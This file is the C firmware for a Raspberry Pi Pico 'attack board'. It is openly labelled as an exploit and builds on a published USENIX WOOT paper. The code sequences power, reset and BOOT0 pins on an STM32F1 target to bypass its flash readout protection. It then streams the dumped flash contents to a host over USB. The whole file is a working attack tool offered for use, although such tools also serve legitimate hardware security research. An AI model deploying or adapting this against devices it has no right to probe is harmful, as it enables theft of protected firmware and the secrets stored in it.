/*
 * Copyright (C) 2024 Patrick Pedersen

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

 * Pi Pico Attack Board Firmware
 * Version: 1.2

 * This attack is based on the works of:
 *  Johannes Obermaier, Marc Schink and Kosma Moczek
 * The relevant paper can be found here, particularly section H3:
 *  https://www.usenix.org/system/files/woot20-paper-obermaier.pdf
 * And the relevant code can be found here:
 *  https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
 *
 */

#include <stdio.h>
#include <pico/stdlib.h>
#include <hardware/uart.h>
#include <hardware/pwm.h>

// Exact steps for attack:
//  Power pin high
//  Wait for serial input
//  Power pin low
//  Wait for reset to go low <- GPIO INPUT
//  Power pin high
//  Wait for SRAM firmware to run (Approx 15ms)
//  Set boot0 pin and reset pin to low
//  Wait for reset release (Approx 15ms)
//  Set reset to input
//  Forward UART to USB

#define LED_PIN PICO_DEFAULT_LED_PIN

#define UART_TX_PIN 0
#define UART_RX_PIN 1
#define POWER_PIN 2
#define RESET_PIN 4
#define BOOT0_PIN 5

#define UART_BAUD 9600
#define UART_ID uart0
#define DATA_BITS 8
#define STOP_BITS 1
#define PARITY UART_PARITY_NONE

#define UART_STALLS_FOR_LED_OFF 10000

const char DUMP_START_MAGIC[] = {0x10, 0xAD, 0xDA, 0x7A};

int main()
{
	stdio_init_all();

	// Prevent interpreting 0x0A as newline (0x0D 0x0A) instead of binary data
	// This will spare you a headache when dealing with putchar()
	stdio_set_translate_crlf(&stdio_usb, false);

	// Init UART
	uart_init(UART_ID, UART_BAUD);
	gpio_set_function(UART_TX_PIN, GPIO_FUNC_UART);
	gpio_set_function(UART_RX_PIN, GPIO_FUNC_UART);
	uart_set_format(UART_ID, DATA_BITS, STOP_BITS, PARITY);
	uart_set_fifo_enabled(UART_ID, true);

	// Init GPIOs
	gpio_init(LED_PIN);
	gpio_init(POWER_PIN);
	gpio_init(RESET_PIN);
	gpio_init(BOOT0_PIN);
	gpio_set_dir(LED_PIN, GPIO_OUT);
	gpio_set_dir(BOOT0_PIN, GPIO_OUT);
	gpio_set_dir(RESET_PIN, GPIO_IN);
	gpio_pull_up(RESET_PIN);

	// Init PWM for indicator LED
	gpio_set_function(LED_PIN, GPIO_FUNC_PWM);
	uint slice_num = pwm_gpio_to_slice_num(LED_PIN);
	pwm_set_wrap(slice_num, 255);
	pwm_set_chan_level(slice_num, PWM_CHAN_A, 0);
	pwm_set_enabled(slice_num, true);

	// -- Attack begins here --

	// Set BOOT0 to high and enable power

	/* Boot into SRAM so we can fetch SRAM reset vector address
	 * See https://github.com/CTXz/stm32f1-picopwner/issues/1#issuecomment-1603281043
	 */
	gpio_put(BOOT0_PIN, 1);

	/* Enable power
	 * Ensure that the power pin set high before configuring it as output
	 * to prevent the target from sinking current through the pin if the debug
	 * probe is already attached
	 */
	gpio_put(POWER_PIN, 1);
	gpio_set_dir(POWER_PIN, GPIO_OUT);

	gpio_put(LED_PIN, 0);

	// -- Ensure that the target exploit firmware has been loaded into the target's SRAM before preceeding --

	// Wait for any serial input to start the attack
	while (getchar_timeout_us(0) == PICO_ERROR_TIMEOUT)
	{
		tight_loop_contents();
	}

	// Drop the power
	gpio_put(LED_PIN, 1);
	gpio_put(POWER_PIN, 0);

	// Wait for reset to go low
	while (gpio_get(RESET_PIN))
	{
		tight_loop_contents();
	}

	// Immediately re-enable power
	gpio_put(POWER_PIN, 1);

	// Debugger lock is now disabled and we're now
	// booting from SRAM. Wait for the target to run stage 1
	// of the exploit which sets the FPB to jump to stage 2
	// when the PC reaches a reset vector fetch (0x00000004)
	sleep_ms(15);

	// Set BOOT0 to boot from flash. This will trick the target
	// into thinking it's running from flash, which will
	// disable readout protection.
	gpio_put(BOOT0_PIN, 0);

	// Reset the target
	gpio_set_dir(RESET_PIN, GPIO_OUT);
	gpio_put(RESET_PIN, 0);

	// Wait for reset
	sleep_ms(15);

	// Release reset
	// Due to the FPB, the target will now jump to
	// stage 2 of the exploit and dump the contents
	// of the flash over UART
	gpio_set_dir(RESET_PIN, GPIO_IN);
	gpio_pull_up(RESET_PIN);

	// Wait for dump start magic to ensure
	// that we don't forward any garbage data
	// caused by the reset
	uint magic_index = 0;
	while (true)
	{
		char c = uart_getc(UART_ID);
		if (c == DUMP_START_MAGIC[magic_index])
		{
			if (++magic_index == sizeof(DUMP_START_MAGIC))
			{
				break;
			}
		}
		else
		{
			magic_index = 0;
		}
	}

	// Forward dumped data from UART to USB serial
	uint stalls = 0;
	while (true)
	{
		if (uart_is_readable(UART_ID))
		{
			char c = uart_getc(UART_ID);
			putchar(c);
			pwm_set_gpio_level(LED_PIN, c); // LED will change intensity based on UART data
			stalls = 0;
		}
		else
		{
			// If no data is received for a while, turn off the LED
			if (++stalls == UART_STALLS_FOR_LED_OFF)
				pwm_set_gpio_level(LED_PIN, 0);
		}
	}
}
